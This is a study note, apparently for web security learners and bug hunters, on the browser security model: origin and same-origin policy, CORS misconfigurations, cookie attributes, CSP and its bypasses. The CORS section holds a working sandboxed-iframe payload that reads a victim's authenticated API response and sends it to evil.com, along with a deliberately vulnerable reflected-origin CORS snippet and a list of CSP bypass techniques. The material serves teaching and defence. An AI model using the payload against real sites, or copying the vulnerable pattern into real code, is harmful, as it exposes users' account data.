---
tags: [foundations, browser]
status: learning
---

# The Browser Security Model

> The browser runs code from thousands of mutually hostile parties on the same machine, in the same process tree, with your bank session sitting in memory. That it works at all is the achievement. Understanding *how* it keeps them apart is the foundation of web security.

---

## 1. The Origin — the unit of trust

An **origin** is the triple: `(scheme, host, port)`.

```
https://app.example.com:443/dashboard
└─┬──┘ └──────┬────────┘ └┬┘
scheme      host         port      ← all three must match
```

| URL | Same origin as `https://app.example.com`? | Why |
|---|---|---|
| `https://app.example.com/other` | ✅ | Path is irrelevant |
| `http://app.example.com` | ❌ | Different scheme |
| `https://api.example.com` | ❌ | Different host (subdomain counts!) |
| `https://app.example.com:8443` | ❌ | Different port |

**Site** is a looser concept: `scheme + eTLD+1`. `app.example.com` and `api.example.com` are *different origins* but the *same site*. Cookies use "site"; SOP uses "origin". This mismatch is why a single XSS on any subdomain can often steal cookies scoped to the parent domain — see [[Session-Management]].

---

## 2. Same-Origin Policy (SOP)

**The rule:** a document from origin A cannot *read* data from origin B.

What SOP does **not** block — and this is where beginners go wrong:

| Action | Blocked? | Consequence |
|---|---|---|
| Read a cross-origin response body | ✅ blocked | The core protection |
| **Send** a cross-origin request | ❌ allowed | → [[CSRF-Cross-Site-Request-Forgery]] |
| Embed a cross-origin image/script/iframe | ❌ allowed | → clickjacking, XSSI |
| Read `<img>` dimensions after load | ❌ allowed | → side-channel leaks |
| Navigate a cross-origin window | ❌ allowed | → tabnabbing, [[Open-Redirect]] chains |
| Time how long a cross-origin load takes | ❌ allowed | → XS-Leaks |

> **The single most important sentence in web security:** SOP prevents *reading* responses, not *sending* requests. CSRF exists entirely in that gap.

---

## 3. CORS — a controlled relaxation of SOP

CORS lets a server *opt in* to being read cross-origin. It is a **server-side decision expressed in response headers**; the browser enforces it.

### Simple vs preflighted requests

A request is "simple" (no preflight) if it's `GET`/`HEAD`/`POST` **and** `Content-Type` is one of `text/plain`, `multipart/form-data`, `application/x-www-form-urlencoded`, **and** no custom headers.

Anything else triggers a preflight:

```http
OPTIONS /api/data HTTP/1.1
Origin: https://evil.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Custom-Auth
```
```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Methods: GET, PUT
Access-Control-Allow-Headers: X-Custom-Auth
Access-Control-Max-Age: 86400
```

### The CORS misconfigurations that pay

**a) Reflected origin + credentials — critical**
```python
# VULNERABLE
@app.after_request
def cors(resp):
    resp.headers['Access-Control-Allow-Origin'] = request.headers.get('Origin')
    resp.headers['Access-Control-Allow-Credentials'] = 'true'
    return resp
```
Any site can now read authenticated responses. Full account data disclosure.

**b) `null` origin accepted**
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
An attacker gets a `null` origin from a sandboxed iframe:
```html
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://victim.com/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://evil.com?d='+btoa(d)))</script>"></iframe>
```

**c) Sloppy origin regex**
```python
if origin.endswith('example.com'):   # matches notexample.com
if origin.startswith('https://example.com'):  # matches https://example.com.evil.com
```

**d) `*` with credentials** — browsers reject this combination, so it's *not* exploitable. Knowing this saves you from submitting an invalid report.

**Correct implementation:** exact-match against an allowlist.
```python
ALLOWED = {'https://app.example.com', 'https://admin.example.com'}
origin = request.headers.get('Origin')
if origin in ALLOWED:
    resp.headers['Access-Control-Allow-Origin'] = origin
    resp.headers['Access-Control-Allow-Credentials'] = 'true'
    resp.headers['Vary'] = 'Origin'   # ← critical, or the cache poisons across origins
```

Forgetting `Vary: Origin` turns a correct CORS config into a cache-poisoning bug.

---

## 4. Cookies

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600; Domain=example.com
```

| Attribute | Effect | Miss it and… |
|---|---|---|
| `HttpOnly` | JS can't read via `document.cookie` | XSS steals the session |
| `Secure` | HTTPS only | Sent in cleartext on any accidental HTTP request |
| `SameSite` | Controls cross-site sending | CSRF |
| `Domain` | If set, shared with **all** subdomains | Any subdomain XSS/takeover steals it |
| `Path` | Weak isolation — **not** a security boundary | Bypassable via iframe DOM access |
| `__Host-` prefix | Forces Secure, no Domain, Path=/ | Best available cookie hardening |

### SameSite in detail

| Value | Cross-site GET (top-level nav) | Cross-site POST | Sub-resource / iframe |
|---|---|---|---|
| `Strict` | ❌ not sent | ❌ | ❌ |
| `Lax` (modern default) | ✅ **sent** | ❌ | ❌ |
| `None` (requires `Secure`) | ✅ | ✅ | ✅ |

**Why `Lax` is not complete CSRF protection:**
1. Cross-site **GET** navigations still send the cookie. Any state-changing GET endpoint is still vulnerable.
2. Browsers historically applied a **2-minute exemption** on newly-set cookies for top-level POSTs (Chrome's "Lax+POST" mitigation), giving a race window.
3. `SameSite` is *site*-scoped, not origin-scoped. An XSS or takeover on `blog.example.com` is same-site with `app.example.com` — SameSite provides zero protection there.

So: SameSite is defence-in-depth. You still need [[CSRF-Cross-Site-Request-Forgery]] tokens on state-changing endpoints.

---

## 5. Content Security Policy (CSP)

CSP limits *where content can load from* and *whether inline script runs*. It reduces XSS **impact**; it does not fix XSS.

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-r4nd0m' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  report-uri /csp-report
```

### Why this specific policy
- `'nonce-...' 'strict-dynamic'` — a per-response random nonce; `strict-dynamic` lets nonce-approved scripts load further scripts, which makes CSP survive real-world bundlers. **This is the modern recommended approach** — allowlists of domains are effectively bypassable.
- `object-src 'none'` — kills Flash/plugin-based bypasses.
- `base-uri 'none'` — without it, an injected `<base href="//evil.com">` hijacks every relative script URL, defeating the nonce.
- `frame-ancestors 'none'` — anti-clickjacking, replaces `X-Frame-Options`.

### Common CSP bypasses to test for
| Weakness | Bypass |
|---|---|
| `'unsafe-inline'` in `script-src` | CSP is decorative; normal XSS works |
| `'unsafe-eval'` | `eval`, `setTimeout("...")`, some template engines |
| Allowlisted CDN (`*.googleapis.com`) | Host a JSONP endpoint or an old AngularJS → arbitrary execution |
| Missing `base-uri` | `<base>` tag injection |
| Missing `object-src` | `<object data="...">` |
| Nonce reused across responses | Predictable → inject with a valid nonce |

**Test yourself:** run any CSP through Google's CSP Evaluator and understand *why* each finding is a finding.

---

## 6. Other browser boundaries worth knowing

- **`postMessage`** — cross-origin messaging by design. The bugs: sender doesn't set `targetOrigin` (uses `*` → leaks to any listener), or receiver doesn't validate `event.origin` (accepts commands from anyone). Both are common, both pay.
- **`window.opener`** — a link opened with `target="_blank"` historically let the new page navigate the opener (tabnabbing). Modern browsers default to `noopener`, but check anyway.
- **Site Isolation** — each site gets its own renderer process, mitigating Spectre-class cross-origin memory reads.
- **COOP / COEP / CORP** — the modern cross-origin isolation headers. Needed to re-enable `SharedArrayBuffer` and high-resolution timers safely.

---

## Practice

1. Build two local origins (`localhost:3000`, `localhost:4000`). Try to `fetch` from one to the other. Read the console error carefully — then fix it with proper CORS. Then break it with a reflected origin and steal your own data.
2. Reproduce the `null` origin sandbox-iframe attack against your own vulnerable app.
3. Take a real site's CSP and write out, header directive by directive, what an attacker with HTML injection could still do.
4. Set a cookie with each `SameSite` value and empirically test which cross-site scenarios send it. Don't take the table above on faith — verify it.

---

## Interview questions

- *Explain SOP and CORS to a backend dev who thinks CORS is a security feature protecting their API.* (It isn't. CORS **relaxes** protection. Their API is reachable by curl regardless; CORS only governs what *browser JS on other origins* may read.)
- *`Access-Control-Allow-Origin: *` — is that a vulnerability?* (Depends entirely on whether the endpoint is authenticated. On a public endpoint, fine. With credentials, browsers block it anyway. The real bug is *reflected* origin + credentials.)
- *Why isn't `SameSite=Lax` enough for CSRF?* (See table above — GET state changes, subdomain/same-site attacks.)
- *You have HTML injection but there's a strict CSP with nonces. What do you try?* (Missing `base-uri`, dangling markup for data exfil, CSS injection, `<meta>` refresh redirect, JSONP on allowlisted hosts, DOM clobbering.)

---

**Next:** [[Cryptography-Fundamentals]]
